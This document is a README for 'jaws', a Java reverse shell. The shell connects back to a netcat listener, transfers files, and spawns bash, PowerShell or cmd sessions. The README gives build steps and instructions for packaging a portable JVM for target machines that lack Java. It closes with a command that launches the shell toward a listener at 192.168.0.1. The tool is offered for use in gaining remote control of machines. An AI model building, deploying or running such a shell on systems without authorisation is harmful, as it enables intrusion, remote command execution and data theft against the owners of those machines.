# jaws
jaws is a java based reverse shell. It can run on whatever OS that java will run on. It connects to a netcat listener over a TCP port. The commands are designed to be modular which allows easy feature additions.

# Current Commands
Supports basic file system commands (ls, cat, mkdir, cd, find, zip/unzip etc.)
Upload/download files with TCP port (jaws->netcat and netcat->jaws)
Start and control multiple types of command line interfaces (bash, sh, powershell, cmd)
Run external programs with arguments

# Compilation Steps
The cc.sh script was made to quickly compile all of the java files. It derives a list of java files from a sources.txt file. This file is created with the following linux command from the src directory

`find . -name '*.java' > sources.txt`

If the letter c is included as an argument the java files will be compiled without packaging into a jar file. All compiled class files will be added to a bin directory.

`./cc.sh c`

Without the c argument, the java files will be compiled and packaged into a jaws.jar file. A manifest.mf file will be used to point to the main class within the jar file.

`./cc.sh`

Refer to the cc.sh script for the specific compilation commands.

# Custom JVM
If the Java Virtual Machine is not installed on the target machine, a portable JVM can be put together. A smaller JVM can be put together with jdeps and jlink. A full JVM is not necessary for the jaws shell. To get a list of required dependency modules use the jdeps command on the jaws.jar file. The command I use is shown below:

`jdeps --print-module-deps bin/jaws.jar`

Currently only two dependencies are required:

java.base,java.desktop

With that list of dependencies, a smaller portable JVM can be packaged with jlink. I use the following command.

`jlink --module-path ~/src/jdk-21/jmods --add-modules java.base,java.desktop --output ../runtime --no-header-files --no-man-pages --compress zip-9 --strip-debug`

The package can be cross compiled for whatever operating system using the appropriate JDK. In the above example I use the portable JDK-21 for windows. You can download the compressed JDK from oracle for Linux, macOS, and Windows.

[Oracle JDK Download](https://www.oracle.com/java/technologies/downloads/#java21)

After downloading the JDK, it needs to be unzipped and the jmods directory needs to be included in the above command. The JVM will be packaged into the directory provided with the --output option. The jar file can then be added into the runtime library and ran with the java binary within the bin folder.

`./runtime/bin/java.exe -jar jaws.jar 192.168.0.1 54321`
